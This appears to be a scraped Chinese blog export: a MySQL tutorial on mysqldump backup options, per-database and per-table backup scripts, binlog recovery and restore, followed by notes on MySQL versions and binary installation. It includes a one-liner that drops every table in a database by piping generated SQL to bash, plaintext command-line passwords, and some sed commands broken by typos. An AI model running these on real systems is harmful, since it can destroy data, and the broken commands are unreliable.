-uroot -p111 --default-character-set=utf8 --compact -B t1 \u0026gt; t_b.sql\r$ cat t_b.sql CREATE DATABASE /*!32312 IF NOT EXISTS*/ `t1` /*!40100 DEFAULT CHARACTER SET utf8 */;\rUSE `t1`;\r/*!40101 SET @saved_cs_client = @@character_set_client */;\r/*!40101 SET character_set_client = utf8 */;\rCREATE TABLE `test1` (\r`id` int(10) unsigned NOT NULL AUTO_INCREMENT,\r`num1` varchar(20) NOT NULL,\r`num2` varchar(20) NOT NULL,\r`num3` varchar(20) NOT NULL,\r`num4` int(11) NOT NULL DEFAULT '0' COMMENT 'test1',\rPRIMARY KEY (`id`)\r) ENGINE=InnoDB AUTO_INCREMENT=2000031 DEFAULT CHARSET=utf8;\r/*!40101 SET character_set_client = @saved_cs_client */;\rINSERT INTO `test1` VALUES (2000001,'690938','794482','1899596',0),(2000002,'7114536','9873892','8025852',0),(2000003,'507584','8460367','779079',0),(2000004,'8514298','234250','5628359',0),(2000005,'7439042','310137','9233557',0),(2000006,'5237373','8486196','6718861',0),(2000007,'8135719','522012','8202901',0),(2000008,'9448472','2633656','4822864',0),(2000009,'6213355','6598180','4350835',0),(2000010,'1959635','6745673','7849459',0),(2000011,'9010275','1503001','484179',0),(2000012,'7911894','8106930','6798971',0),(2000013,'9674065','7973412','844865',0),(2000014,'304088','8985848','4016974',0),(2000015,'3127327','3585711','8546578',0),(2000016,'1975754','4239037','5267926',0),(2000017,'3622517','2308806','676480',0),(2000018,'6455983','250474','1884422',0),(2000019,'8670686','7700168','2488781',0),(2000020,'9343400','9250657','8223086',0),(2000021,'3363461','2148048','649856',0),(2000022,'6805137','2076115','9965166',0),(2000023,'3597485','8091927','9667180',0),(2000024,'4060121','1299065','4314962',0),(2000025,'7677614','5443186','4183087',0),(2000026,'4585879','380131','8143022',0),(2000027,'9574716','3444513','8498418',0),(2000028,'2158552','5297508','11882',0),(2000029,'4166888','798795','1493311',0),(2000030,'5070170','870919','9144083',0);\r\u0026ndash;compact参数说明：\n（测试时用的比较多）可以优化输出内容的大小，让容量更少，适合调试。\n--compact\tGive less verbose output (useful for debugging).\tDisables\rstructure comments and header/footer contructs. Enables\roptions --skip-add-drop-table --no-set-names\r--skip-disable-keys --skip-add-locks\r参数说明：该选项使得输出内容更简介，不包括默认选项中各种注释。有如下几个参数的功能。\n--skip-add-drop-table\n--no-set-names\n--skip-disable-keys\n--skip-add-locks\n压缩备份的数据 --- 输出时用管道进行备份，压缩效率将近3倍\r--- 这个保存为一个压缩文件\rmysqldump -S /data/3306/mysql.sock -uroot -p111 -B t1|gzip \u0026gt;t1.sql.gz\r1360 t1.sql.g\r3365 t2.sql\r小结：\n备份数据使用-B参数，会在备份数据中增加建库及use库的语句 备份数据使用-B参数，后面可以直接接多个库名。 共gzip对备份的数据亚索 debug时可以用\u0026ndash;compact减少输出，但不用于生产 指定字符集备份用\u0026ndash;default-character-set=utf8（一般不用） mysqldump的工作原理 利用mysqldump命令备份数据的过程，实际上就是把数据从mysql库里以逻辑的sql语句的形式直接输出或者生成备份的文件的过程。\n提示：使用mysqldump是把数据库的数据导出通过sql语句的形式存储，这种备份方式称之为逻辑备份，效率不是很高，一般50G以内的数据。\n其他备份方式：物理备份：cp tar（停库），xtrabackup物理热备份。 备份多个库及多个参数\nmysqldump -uroot -p111 -S /data/3306/mysql.sock --compact \\\r-B test t1|gzip\u0026gt;/data/test1.sql\r-B参数说明\n-B，参数是关键，表示接多个库并且增加use db和create database db的信息\r-B, --databases Dump several databases. Note the difference in usage; in\rthis case no tables are given. All name arguments are\rregarded as database names. 'USE db_name;' will be\rincluded in the output.\r# 用于导出多个数据库，注意这种情况系没有表。所有的名称参数都被认作为是数据库。\r# 每个数据库名以空格隔开，将使用的数据库名称包含到输出里\r# 当-B后的数据库列全时，同-A参数。\r分库备份 分库备份实际上就是执行一个备份语句备份一个库，如果数据库里有多个库，就执行多条相同的备份单个库的备份语句就可以备份多个库了，注意每个库都可以用对应备份的库作为库名，结尾加.sql。备份多个库的命令如下：\nmysqldump -uroot -p111 -B oldboy;\nmysqldump -uroot -p111 -B test;\n\u0026hellip;.\n\u0026hellip;.\n分库备份法1：\nmysql -uroot -p111 -S /data/3306/mysql.sock \\\r-e 'show databases;'|\\\regrep -v \u0026quot;Database|_schema|mysql\u0026quot;|\\\rsed -r 's#^(.*)#mysqldump -uroot -p111 -S /data/3306/mysql.sock \\1#g'\rmysql -uroot -p111 -S /data/3306/mysql.sock bingbing\rmysql -uroot -p111 -S /data/3306/mysql.sock t1\rmysql -uroot -p111 -S /data/3306/mysql.sock test\r-- 将结果交给bash\rmysql -uroot -p111 -S /data/3306/mysql.sock \\\r-e 'show databases;'|egrep -v \u0026quot;Database|_schema|mysql\u0026quot;|\\\rsed -r 's#^(.*)#mysqldump -uroot -p111 -S /data/3306/mysql.sock -B \\1|gzip\u0026gt;\\1.sql.gz#g' \\\r|bash\r法2：\n见分库分表备份视频：http://edu.51cto.com/course/course_id-808.html\n分库备份的意义何在？\n有时一个企业的数据库里会有多个库，例如（www.bbs，blog），但是出问题的时候很可能是某一个库，如果在备份时把所有的库都备份成了一个数据文件的话，回复某一个库的数据是就比较麻烦了。\n备份单个表 语法：\nmysqldump -uuserName -ppassWord dbName tableName \u0026gt;/data.sql\rmysqldump -uuserName -ppassWord dbName tableName1 tableName2.. \u0026gt;/data.sql\r提示：不能加-B参数了，因为库后面就是表了。\n企业需求：一个库里有大表有小标，有时可能需要只回复某一个小表，上述的多表备份很难拆开，就想没有分库那样导致恢复某一个小表很麻烦。\n那么又如何进行分表备份呢？如下，和分库的思想一样，每执行一条语句备份一个表，生成不同的数据文件即可。如下：\nmysql -uroot -p111 -e 'use test; show tables;' \\\r|egrep -v 'Tables_in_test' \\\r|sed -r 's#^(.*)#mysqldump -uroot -p111 --compact test \\1\u0026gt;\\1.sq$g'|bash\r分表备份缺点：文件多，很碎\n备一个完整全备，在做一个分库分表备份\r脚本批量备份恢复多个SQL文件\r面试题：多个库或者多个表备份到一块了，如何恢复单个库或者表？\n解答：\n第三方测试库，导入到库里，然后把需要的备份出来，恢复到正式库里。 单表：grep表名 bak.sql\u0026gt;tab_name。 实现分库分表备份 备份数据表结构 利用mysqldump -d参数只备份表的结构，例：备份oldboy库的所有表的结构\nmysqldump -uroot -p111 -d --compact -B test \u0026gt; t.sql\r如果只导出数据则用-t\nmysqldump -uroot -p111 -S /data/3306/mysql.sock -t --compact -B test \u0026gt; 1t.sql -T --tab=path：语句与数据分离，数据为文本。\nmysqldump -uroot -p111 -S /data/3306/mysql.sock t1 test1 -T /data\r注意只能对表进行分离，对数据库进行分离提示如下：\n$ mysqldump -uroot -p111 -S /data/3306/mysql.sock -B t1 -T /data mysqldump: --databases or --all-databases can't be used with --tab.\r小结：\n-B备份多个库（并添加create和use语句） -d只备份库表结构 -t只备份数据（sql语句形式） -T分离表和数据成不同的文件，数据是文本，非SQL语句 刷新binlog参数 mysqldump用于定时对某一时刻的数据的全备份，例如：00点进行备份bak.sql.gz\n增量备份：当有数据写入到数据库时，还会同时把更新的SQL语句写入到对应的文件里，这个文件就叫做binlog。\n比如说晚上0点做备份， 10点宕机了，0-10点的数据就丢失了\n10点前丢失数据需要恢复的数据：\n00点时刻备份的bak.sql.gz数据还原到数据库，这个时候数据恢复到了00点 00-10点数据，就要从binlog里恢复。 binlog作用 记录数据库更新的sql语句，不记录show select等，只是记录对数据库记录变更的二进制文件。\n在mysql数据库当中，当你做一个全备之后到出问题的时刻，要想恢复，就是全备+全备之后的所有binlog。\n定界binlog 问题：怎么界定备份之后和binlog文件之间连接的很紧密不多也不少。\n通过文件的日志点。可以通过-F做一个区分。\n只要我们做了备份，然后就刷新binlog，将来恢复的就是130以下的。130以上的包里面就包含了 binlog日志切割：确定全备和增量的结界点-F刷新binlog日志，生成新日志文件，将来增量恢复从这个新日志文件开始。\nbinglog文件生效需要一个参数：log-bin log-bin=/data/3306/mysql-bin\n$ ll # ←备份前，查看目录binlog文件\rmysql-bin.000316\rmysql-bin.000317\rmysql-bin.index\rmysqldump -uroot -p111 -S /data/3306/mysql.sock --compact -B t1 \u0026gt; t1.sql -F\r$ ll #←在刷新之后可以看到binlog文件增加了\rmysql-bin.000316\rmysql-bin.000317\rmysql-bin.000318\rmysql-bin.index\r--master-data 在备份语句里添加 CHANGE MASTER 语句及 binlog 文件及位置点信息\n值1，为可执行的CHANGE MASTER语句\n值2，为注释的--CHANGE MASTER语句\n注：--master-data除了增量恢复确定临界点外，做主从复制时作用更大\n# 不加--master-data语句\rmysqldump -uroot -p111 --compact -B t1 \u0026gt; t1.sql\rcat t1.sql CREATE DATABASE /*!32312 IF NOT EXISTS*/ `t1` /*!40100 DEFAULT CHARACTER SET utf8 */;\r-- 加上master-data语句后\rmysqldump -uroot -p111 --compact -B t1 \u0026gt; t1.sql --master-data=1\rcat t1.sql CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000318', MASTER_LOG_POS=107;\rCREATE DATABASE /*!32312 IF NOT EXISTS*/ `t1` /*!40100 DEFAULT CHARACTER SET utf8 */;\r$ mysqldump -uroot -p111 --compact -B t1 \u0026gt; t1.sql --master-data=2\r$ cat t1.sql -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000318', MASTER_LOG_POS=107;\rmysqldump关键参数说明 参数 说明 -B 指定多个库，增加建库语句和use语句。 \u0026ndash;compact 去掉注释，适合调试输出，生产不适用 -A 备份所有库 -F 刷新binlog日志，生成新文件，将来增量恢复从这个文件开始。 \u0026ndash;master-data 增加binlog日志文件名及对应的位置点（即CHANGE MASTER语句）。\u0026ndash;mater-data=1不注释 2注释 -x \u0026ndash;lock-all-tables -l \u0026ndash;lock-tables lock all tables for read -d 只备份数据，无表结构，SQL语句形式。 -t 只备份数据，无库表结构，SQL语句形式。 -T 库表和数据分离不同文件，数据是文本形式。 \u0026ndash;single-transaction 适合innodb事务数据库备份 -q --quick don\u0026rsquo;t bufferquery dump directly to stdout (Defaults to on; use \u0026ndash;skip-quick to disable) 说明：innodb表在备份时，通常启用选线\u0026ndash;single-transaction来保证备份的一致性，实际上它的工作原理是设定本次会话的隔离级别为REPEATABLE READ，确保本次会话（dump）时，不会看到其他会话已经提交了的数据。\n生产场景不同引擎mysqldump备份命令 myisam引擎企业生产备份，命令（适合所有引擎或混合引擎）： mysqldump -uroot -p111 -A -B -F -R --master-data=2 -x --events|gzip \u0026gt; /data/all.sql.gz\r提示：-F也可以不用，与\u0026ndash;，master-data有写重复\ninnodb引擎企业生产备份命令：推荐使用 mysqldump -uroot -p111 -A -B -F -R --master-data=2 --events --single-transaction|gzip \u0026gt;/data/all.sql.gz\r\u0026ndash;master-data作用： 使用\u0026ndash;master-data=2进行备份文件会增加如下内容：适合普通备份增量恢复 --CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.00020', MASTER_LOGZ_POS=1191\r使用\u0026ndash;maste-data=1进行备份文件会增加如下内容：更适合主从复制 CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.00020', MASTER_LOGZ_POS=1191\r锁表的原理： innodb有acid的特性\ndump命令是看不到后面生成的数据，只能看到执行这个命令时所有数据之前的这个数据\n事务引擎不锁表备份原理：\u0026ndash;single-transaction 会话隔离\n额外补充：\nmysqldump逻辑备份说明 缺点：效率不是特别高\n优点：简单、方便、可靠、迁移。\n超过50G可选方案 恢复数据到数据库的时候，认为通过SQL语句将数据删除的时候，做主从复制的时候\n恢复数据库实战 数据库恢复事项\n数据恢复和字符集关联很大，如果字符集不正确会导致恢复的数据乱码。 mysql命令以及source命令恢复数据可的原理就是把文件的SQL语句，在数据库里重新执行过程。\n利用source命令恢复数据库。 进入mysql数据库控制台，mysql -uroot -p登陆后\nuse database;\n然后使用source xx.sql，后面参数为脚本文件（如这里用到的sql）\nsource 2.sql 这个文件是系统路径，默认是登陆mysql前的系统路径\n提示：\nsource数据恢复和字符集关联很大，如果字符集不正确会导致恢复的数据乱码。\rutf8数据库，那么恢复的文件格式需要为utf8无bom头。\r利用mysql命令恢复（标准）\nmysql -uroot -p111 -e 'use test;drop tables test1;show tables;'\rmysql -uroot -p111 test \u0026lt; /2.sql\r假设开发人员让我们插入数据到数据库（可能是邮件发给我们的，内容可能是字符串或是文件）sql文件里没有use db这样的字符，在导入时就要指定数据库名了。\n$ mysql -uroot -p111 \u0026lt; /data/3306/2.sql\rERROR 1046 (3D000) at line 22: No database selected\r$ mysql -uroot -p111 -e'use test';\rERROR 1049 (42000) at line 1: Unknown database 'test'\r$ mysql -uroot -p111 test\u0026lt;/data/3306/2.sql\r如果在导出时指定-B参数，恢复时无需指定库恢复，为什么？\n因为-B参数带了use test;还会有create database test;，而恢复时指定库就类似与use test。\n如果mysqldump备份时指定了-B，则恢复可以用如下方法：\nmysql -uroot -p111 \u0026lt; back.sql\rmysql -uroot -p111 DbName \u0026lt; back.sql$ 条件是dbname库必须存在\r提示：此处DbName相当于use Dbname\n问题：分库分表备份的数据如何快速恢复呢？\n还是通过脚本读指定的库和表，调用mysql命令恢复\nfor name in `ls /back/*.sql|sed -r 's#.back.sq$#g'`;do mysql -uroot -p111 test\u0026lt;${name}.back.sql; done;\r针对压缩的备份数据恢复\n方法1：\ngzip -d /back/mysql_back.sql.gz\rmysql -uroot -p111 dbname \u0026lt; /back/mysql_back.sql\rgzip -cd mysql_back.sql.gz \u0026gt; mysql.sql$←不删除源备份文件\r方法2：\ngunzip \u0026lt; b.sql.gz \u0026gt; /opt/mysql.sql\rmysql -uroot -p111 \u0026lt; /opt/mysql.sql\r或者\ngunzip -c back.sql.gz|mysql -uroot -p111 test\rmysql -uroot -p111 -e \\\r'SELECT CONCAT(\u0026quot;drop table \u0026quot;,table_name,\u0026quot;;\u0026quot;) FROM information_schema.`TABLES` WHERE table_schema=\u0026quot;test\u0026quot;;' \\\r|grep -Ev 'CONCAT(\u0026quot;drop table \u0026quot;,table_name,\u0026quot;;\u0026quot;)'|sed -r \u0026quot;s#^(.*)#mysql -uroot -p111 -e 'use test;\\1'#g\u0026quot; \\\r|bash\r分表分库备份脚本\n#!/bin/sh\r. /etc/init.d/functions\r# define variable\rBackDir=~/back\rUser=root\rPassWD=111\rSocket=/data/3306/mysql.sock\r# define comment\rLogin=\u0026quot;mysql -u${User} -p${PassWD} -S ${Socket}\u0026quot;\rDump=\u0026quot;mysqldump -u${User} -p${PassWD} -S${Socket} -x --master-data=2 --compact\u0026quot;\rDataBase=`$Login -e 'show databases;'|egrep -v '*chema|mysql'|sed '1d'`\r[ ! -d $BackDir ] \u0026amp;\u0026amp; mkdir -p $BackDir\rfor list in $DataBase\rdo\rST=`$Login -e \u0026quot;use $list;show tables;\u0026quot;|sed '1d'`\r[ ! -d $BackDir/$list ] \u0026amp;\u0026amp; mkdir -p $BackDir/$list\rfor table in $ST\rdo\r$Dump $list $table|gzip\u0026gt;$BackDir/$list/$table.`date +%F`.sql.gz\r[ $? -eq 0 ] \u0026amp;\u0026amp; action \u0026quot;$list \u0026gt; $table is ok\u0026quot; /bin/true || \u0026quot;$list \u0026gt; $table dump is fail\u0026quot;\rdone\rdone\r","permalink":"https://www.oomkill.com/2017/05/ch3-mysql-backup-and-restore/","summary":"","title":"ch03 - MySQL的备份与恢复"},{"content":"MySQL数据库简介 编程语言排名：http://www.tiobe.com/tiobe-index\n数据库排名：http://db-engines.com/en/ranking\nMySQL数据库分类与版本升级 MySQL数据库官网为http://www.mysql.com，其发布的MySQL版本采用双授权政策，和大多数开源产品的路线一样，分别为社区版和商业版，而这两个版本又各自分四个版本依次发布，这四个版本为Alpha版、Beta版、RC版和GA版（GA正式发布版）\nMySQL数据库商业版和社区版的区别 在前面的内容已经阐述过了，MySQL的版本发布采用双授权政策，即分为社区版和商业版，而这两个版本又各自分四个版本依次发布：Alpha版、Beta版、RC版和GA版（GA正式发布版）\nAlpha版 Alpha版一般只在开发的公司内部运行，不对外公开。主要死开发者自己对产品进行测试，检查产品是否存在缺陷、错误，验证产品功能与说明书、用户手册是否一致。MySQL是属于开放源代码的开源产品，因此需要世界各地开发者、爱好者和用户参与软件的开发测试和手册编写等工作。所以会对外公布此版本的源码和产品，方便任何人可以参与开发测试工作，甚至编写与修改用户手册。\nBeta版 Beta版一般是完成功能的开发和所有的测试工作时候的产品，不会存在较大的功能或性能BUG，并且邀请或提供给公户体验与测试，以便更全面地测试软件的不足之处或存在的问题。\nRC版 RC版属于生产环境发布之前的一个小版本或称候选版，是根据Beta测试结果，收集到的BUG或缺陷之处等收集到信息，进行修复和完善之后的新一版本\nGA版 GA版是软件产品正式发布的版本，也称生产版本的产品。一般情况下，企业生产环境都会选择GA版本的MySQL软件，用于真实的生产环境中。偶尔有个别的大型企业会追求新功能驱动而牺牲稳定性使用其他版本，但这个是个例。\nMySQL四中发布版本选择说明 MySQL AB官方网站会把五种数据库版本都提供下载，主要是MySQL数据库属于开发源代码的数据库产品，鼓励全球的技术爱好者参与研发、测试、文档编写和经验分享，甚至包过产品发展规划，对于Development版本、Alpha版本和Beta版本是绝对不允许使用在任何生产环境，毕竟这是一个GA版本之前，也即生产版本发布之前的一个小版本。另外，对MySQL数据库GA版本，也是需要慎重选择，开源社区产品毕竟不是经过严格的测试工序完成的产品，是全球开源技术人员的资源完成的，会存在比商业产品稳定性弱的缺陷。更严格的选择见后文。\nMySQL产品路线 MySQL产品路线变更历史背景 早起MySQL也是遵循版本号逐渐增加的方式发展的，格式例如：mysql-x.xx.xx.tar.gz，例如DBA都非常熟悉的生产场景版本：4.1.7、5.0.56等。\n近几年，为了提高MySQL产品的竞争优势、以及提高性能、降低开发维护成本等原因，同时，更方便企业用户更精准的选择适合的版本产品用于自己的企业生产环境中。 MySQL在发展到5.1系列版本之后，重新规划为3条产品线\n5.0.xx到5.1.xx产品线介绍 第一条产品线：5.0.xx及升级到5.1.xx的产品系列，这条产品线继续完善与改进其用户体验和性能，同时增加新功能，这条路线可以说是MySQL早起产品的延续系列，这一系列的产品发布情况及历史版本如下： MySQL 5.1是当前稳定（产品质量）发布系列。只针对漏洞修复重新发布；没有增加会影响稳定性的新功能。\nMySQL 5.1:Previous stable(production-quality) release MySQL 5.0是前一稳定（产品质量）发布系列。只针对严重漏洞修复和安全修复重新发布；没有增加会影响该系列的重要功能。 MySQL 5.0:Old stable release nearing the end of the product lifecycle MySQL 4.0和3.23是旧的稳定(产品质量)发布系列。该版本不再使用，新的发布只用来修复特别严重的漏洞(以前的安全问题)。 5.4.xx开始到5.7.xx产品线系列介绍 为了更好的整合MySQL AB公司社区和第三方公司开发的新存储引擎，以及吸收新的实现算法等，从而更好的支持SMP架构，提高性能而做了大量的代码重构。版本号为从5.4.xx开始，目前发展到了5.6.x 主流：互联网公司用mysql5.5，逐步过渡到5.6。\n6.0.xx-7.1.xx产品线系列介绍 第三条产品线：为了更好的推广MySQL Cluster版本，以及提高MySQL Cluster的性能和稳定性，以及功能改进和增加，以及改动mysql基础功能，使其对Cluster存储引擎提供更有效地支持与优化。版本号为6.0.xx开发，目前发展到7.1.xx\nMySQL数据库软件命名介绍 MySQL数据库软件的名字是由3个数字和一个后缀组成的版本号。例如，像 mysql-5.0.56.tar.gz 的版本号这样解释：\n第一个数字（5）为主版本号，描述了文件格式。所有版本5发行都有相同文件格式。 第二个数字（0）为发行级别，主版本号和发行级别组合到一起便构成了发行序列号。 第三个数字（56 为在此发行系列的版本号，随每个新分发版本递增。通常你需要已经选择的发行(release)的最新版本。 每次更新后，版本字符串的最后一个数字递增。如果相对于前一个版本增加了新功能或有微小的不兼容性，字符串的第二个数字递增。如果文件格式改变，第一个数字递增。 后缀显示发现的稳定性级别。通过一系列后缀显示如何改进稳定性。可能的后缀有：\nalpha 表明发行包含大量未被彻底测试的新代码。已知的缺陷应该在新闻小节被记录。请参见附录D：MySQL变更史。在大多数alpha版本中也有新的命令和扩展。alpha版本也可能有主要代码更改等开发。但我们在发布前一定对其进行测试。\nbeta 意味着该版本功能是完整的，并且所有的新代码被测试了，没有增加重要的新特征，应该没有已知的缺陷。当alpha版本至少一个月没有出现报导的致命漏洞，并且没有计划增加导致已经实施的功能不稳定的新功能时，版本则从alpha版变为beta版。在以后的beta版、发布版或产品发布中，所有API、外部可视结构和SQL命令列均不再更改。\nrc 是发布代表；是一个发行了一段时间的beta版本，看起来应该运行正常。只增加了很小的修复。(发布代表即以前所称的gamma 版) 如果没有后缀，这意味着该版本已经在很多地方运行一段时间了，而且没有非平台特定的缺陷报告。只增加了关键漏洞修复修复。这就是我们称为一个产品（稳定）或“通用”版本的东西。\nMySQL的命名机制于其它产品稍有不同。一般情况，我们可以很放心地使用已经投放市场两周而没有被相同发布系列的新版本所代替的版本。\nMySQL产品版本最终选择建议 稳定版：选择开源的社区版的稳定GA版本。 产品线：可以选择5.1或5.5，互联网公司主流5.5，其次是5.1和5.6 选择MySQL数据库GA版本发布后6个月以上的GA版本 选择前后几个月没有打的BUG修复的版本，二不是大量修复BUG的集中版本 最好向后较长时间没有更新发布的版本 考虑开发人员开发程序使用的版本是否兼容你选择的版本 作为内部开发测试数据库环境，跑大概3-6个月的时间 优先企业非核心业务采用新版本的数据库GA版本软件 向DBA高手请教，使用真正的高手们使用过得好用的GA版本产品 经过上述工序后，若是没有重要功能BUG或性能瓶颈，则可以开始开率作为任何业务数据服务的后端数据库软件。 安装MySQL 最正宗的产品线5.1及以前：常规的编译方式安装MySQL\n所谓常规方式编译安装MySQL就是延续早起MySQL的3部曲安装方式，即 ./configure; make; make install\n此种方式适合所有 MySQL 5.0.xx ~ 5.1.xx产品系列，是最常规的编译方式。\n采用cmake方式编译安装MySQL 由于MySQL 5.5.xx ~ 5.6.xx 产品系列特殊性，所以编译方式也和早期的产品安装方式不同，采用cmake或gmake方式编译安装。即 ./cmake;make;make install，生产场景具体命令及参数为\n采用二进制方式免编译安装MySQL 采用二进制方式免编译安装MySQL，这种方式和yum/rpm包安装方式类似，适合类MySQL产品系列，不需要负载的编译设置及编译时间等待，直接解压下载的软件包，初始化可完成mysql的安装启动。\n如何正确选择MySQL的安装方式 yum/rpm安装适合对数据库要求不太高的场合，例如并发不大，公司内部，企业内部的一些应用场景。二进制免安装比较简单方便，适合5.0-5.1和5.5-5.6系列，是很多专业DBA的选择，普通linux运维人员多采用编译的方式，5.0-5.1采用的常规方式，5.5-5.6采用cmake方式。\n建议，安装机器较少，推荐cmake方式，数量多了就用二进制免安装。\nMySQL下载 http://www.mysql.com\nenterprise：企业版 商业版 community：社区版 yum repository：yum仓库（centos redhat fedora） apt repository：apt-get仓库（debian Ubuntu） SUSE repository：suse仓库 window：windows版 企业场景MySQL安装方式 序号 安装方式 特点说明 1 yum/rpm包安装 简单、速度快，但是不能定制安装，入门新手常用这种方式 2 二进制安装 解压软件，简单配置后就能使用，不用安装，速度较快，专业DBA喜欢这种方式。软件名如：\nlinux-5.5.32-linux2.6-x86_64.tar.gz\nmysql-5.6.33-linux-glibc2.5-x86_64.tar 3 源码编译安装 可以定制安装，但是安装时间长，例如：字符集安装路径等，软件名：linux-5.5.32.tar.gz。\n针对mysql5.1；\nmysql5.5以上 ./cmake ; gmake;gmake instal ; 4 源码软件结合yum/rpm安装 把源码软件制作成符合要求的rpm，放到yum仓库里，然后通过yum来安装，结合上面1和3的优点，即安装快速，可任意定制参数，但是安装者需要具备更深能力。 默认路径 usr/local/mysql\n大型门户把源码根据企业的需求制作成rpm，搭建yum仓库，yum install xxx -y\n二进制包安装 创建MySQL用的账号 useradd -s /sbin/nologin -M mysql\r二进制方式安装mysql 解压软件包\ntar -zxf mysql-5.5.32-linux2.6-x86_64.tar.gz\r移动目录\nmv mysql-5.5.32-linux2.6-x86_64 /app/mysql-5.5.32\r创建软连接，生成去掉版本号的路径方便访问\nln -s /app/mysql-5.5.32/ /app/mysql\r提示：操作到此部，相当于编译安装make install之后\n初始化MySQL $ /app/mysql/scripts/mysql_install_db \\\r--basedir=/app/mysql/ \\\r--datadir=/app/mysql/data \\\r--user=mysql\rWARNING: The host 'centos' could not be looked up with resolveip.\rThis probably means that your libc libraries are not 100 % compatible\rwith this binary MySQL version. The MySQL daemon, mysqld, should work\rnormally with the exception that host name resolving will not work.\rThis means that you should use IP addresses instead of hostnames\rwhen specifying MySQL privileges !\rInstalling MySQL system tables...\rOK\rFilling help tables...\rOK\rTo start mysqld at boot time you have to copy\rsupport-files/mysql.server to the right place for your system\r.....\r.....\rYou can start the MySQL daemon with:\rcd /app/mysql/ ; /app/mysql//bin/mysqld_safe \u0026amp;\rYou can test the MySQL daemon with mysql-test-run.pl\rcd /app/mysql//mysql-test ; perl mysql-test-run.pl\rPlease report any problems with the /app/mysql//scripts/mysqlbug script!\r初始化MySQL配置文件 $ ls /app/mysql/support-files/*.cnf\rmy-huge.cnf\rmy-innodb-heavy-4G.cnf\rmy-large.cnf\rmy-medium.cnf\rmy-small.cnf\r# my-medium.cnf \u0026lt; my-small.cnf \u0026lt; my-small.cnf \u0026lt; my-huge.cnf \u0026lt; my-innodb-heavy-4G.cnf\r虚拟机测试环境下选择my-small.cnf配置模板。如果是生产环境可以根据硬件配置选择高级的配置文件\ncp /app/mysql/support-files/my-small.cnf /etc/my.cnf\r配置启动MySql数据库 设置启动脚本 二进制默认安装路径是/usr/local/mysql，启动脚本里是/usr/local/mysql都需要替换\n# 启动脚本\r/app/mysql/bin/mysqld_safe\r# 替换命令\rsed -i 's#/usr/local/mysql#/app/mysql#g' /app/mysql/bin/mysqld_safe\r启动数据库\n传统方式 cp mysql.server /etc/init.d/mysqld\rsed -i 's#/usr/local/mysql#/app/mysql#g' /etc/init.d/mysqld\rchmod +x /etc/init.d/mysqld\rkillall mysqld\r$ /etc/init.d/mysqld start\rStarting MySQL.. SUCCESS!\r$ /etc/init.d/mysqld stop\rShutting down MySQL. SUCCESS!\r$ /app/mysql/bin/mysqld_safe \u0026amp; #\u0026lt;==“\u0026amp;”作用是在后台执行MySQL服务\rmysql启动错误\n$ ./mysql start\rStarting MySQL...\r$ 170521 22:59:38 mysqld_safe error: log-error set to '/data/3306/logs/mysql_3306.err', however file don't exists. Create writable for user 'mysql'.\rmysqlbug https://bugs.mysql.com/bug.php?id=84427\n检查MySQL数据库是否启动\n$ lsof -i :3306\rCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\rmysqld 38313 mysql 10u IPv4 73384 0t0 TCP *:mysql (LISTEN)\r配置mysql命令全局使用 配置全局路径的意义\n如果不为MySQL的命令配置全局路径，就无法直接在命令行输入mysql这样的命令，只能用全局命令\n方法1：\nvi /etc/profile\rPATH=\u0026quot;/app/mysql/bin:$PATH\u0026quot;\rsource /etc/profile\recho 'PATH=\u0026quot;/app/mysql/bin:$PATH\u0026quot;' \u0026gt;\u0026gt;/etc/profile \u0026amp;\u0026amp; . /etc/profile\r方法2：\n# 尽量往前面拷，要不会和系统yum安装的mysql冲突\rcp /app/mysql/bin/* /usr/local/sbin $ which mysql\r# 如果找到的是 /usr/bin是系统yum安装的，不要让我们安装的和yum安装的冲突\r/app/mysql/bin/mysql 方法3：\nln -s /app/mysql/bin/* /usr/local/sbin/\r特别强调：必须把MySQL命令路径放在PATH路径中的前面，否则可能会导使用了mysql等命令和编译安装的不是一个，进而产生错误。\nyum安装MySQL命令访问编译安装的服务器而出来问题：http://oldboy.blog.51cto/25614110/011\nMySQL-5.6 二进制包安装 安装成功提示：与MySQL 5.5.x一样看到两个OK即安装完毕\n$ /app/mysql/scripts/mysql_install_db \\\r--basedir=/app/mysql/ \\\r--datadir=/app/mysql/data \\\r--user=mysql\rWARNING: The host 'lamp_server' could not be looked up with /app/mysql//bin/resolveip.\rThis probably means that your libc libraries are not 100 % compatible\rwith this binary MySQL version. The MySQL daemon, mysqld, should work\rnormally with the exception that host name resolving will not work.\rThis means that you should use IP addresses instead of hostnames\rwhen specifying MySQL privileges !\rInstalling MySQL system tables...2016-09-28 17:45:23 0 [Warning] TIMESTAMP with implicit DEFAULT\r....\r....\rOK\rFilling help tables...2016-09-28 17:45:28 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).\r....\r将启动脚本复制到/etc/ini.d下\ncp support-files/mysql.server /etc/init.d/mysqld\rcp my.cnf /etc/my.cnf #←修改配置文件\rvi /etc/my.cnf\r[mysqld] 中添加：\nbasedir = /usr/local/mysql\rdatadir = /usr/local/mysql/data\rport = 3306\rserver_id = 1\r将全局启动命令做个链接\nln -s /app/mysql/bin/mysql /usr/bin\recho \u0026quot;PATH=/app/mysql/bin:$PATH\u0026quot; \u0026gt;\u0026gt;/etc/profile\rmysql5.6二进制后登陆\n$ mysql -uroot -p\rWelcome to the MySQL monitor. Commands end with ; or \\g.\rYour MySQL connection id is 2\rServer version: 5.6.33 MySQL Community Server (GPL)\rCopyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.\rOracle is a registered trademark of Oracle Corporation and/or its\raffiliates. Other names may be trademarks of their respective\rowners.\rType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\rmysql\u0026gt;\rMySQL多实例 什么是MySQL多实例？ 简单的说，MySQL多实例就是一台服务器上同时开启多个不同的服务器端口（如3306、3307），同时运行多个MySQL服务器进程，这些服务进程通过不同socket监听不同的服务端口来提供服务。\n这些MySQL多实例共用一套MySQL安装程序，使用不同的my.cnf（也可相同）配置文件、启动程序（也可以相同）的数据文件。在提供服务时，多实例MySQL在逻辑上看来是各自独立的，他们根据配置文件的对应设定值，获得服务器相应数量的硬件资源。\nMySQL多实例就相当于房子的多个我是，每个实例可以看做一件我是，整个服务器就是一套房子，服务器的硬件资源（cpu,mem,disk）、软件资源（centos）可以看做房子的卫生间、厨房、客厅，是房子的公用资源。\nnginx apache 